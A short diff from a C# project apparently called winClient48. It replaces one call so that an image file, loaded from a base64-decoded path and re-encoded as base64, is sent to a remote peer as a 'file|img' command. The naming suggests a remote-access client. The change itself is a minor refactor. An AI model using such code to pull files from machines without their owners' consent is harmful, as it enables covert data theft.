@@ -364,7 +364,7 @@ namespace winClient48
                     string filename = clsCrypto.b64D2Str(enc_file);
                     Bitmap img = (Bitmap)Image.FromFile(filename);
                     string b64_data = Global.BitmapToBase64(img);
-                    v.encSend(2, 0, $"file|img|{enc_file};{b64_data}");
+                    v.SendCommand($"file|img|{enc_file};{b64_data}");
                 }
             }
             catch (Exception ex)
